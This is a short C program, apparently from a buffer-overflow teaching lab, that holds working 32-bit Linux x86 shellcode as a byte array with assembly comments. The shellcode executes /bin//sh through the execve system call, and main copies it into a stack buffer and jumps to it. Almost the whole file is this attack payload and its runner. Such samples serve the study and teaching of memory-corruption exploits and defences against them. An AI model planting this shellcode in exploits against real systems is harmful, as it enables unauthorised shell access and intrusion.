/* call_shellcode.c */
/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
const char code[] =
"\x31\xc0" /* line 1: xorl %eax,%eax */
"\x50" /* line 2: pushl %eax */
"\x68""//sh" /* line 3: pushl $0x68732f2f */
"\x68""/bin" /* line 4: pushl $0x6e69622f */
"\x89\xe3" /* line 5: movl %esp,%ebx */
"\x50" /* line 6: pushl %eax */
"\x53" /* line 7: pushl %ebx */
"\x89\xe1" /* line 8: movl %esp,%ecx */
"\x99" /* line 9: cdql */
"\xb0\x0b" /* line 10: movb $0x0b,%al */
"\xcd\x80" /* line 11: int $0x80 */
;
int main(int argc, char **argv)
{
char buf[sizeof(code)];
strcpy(buf, code);
((void(*)( ))buf)( );
}
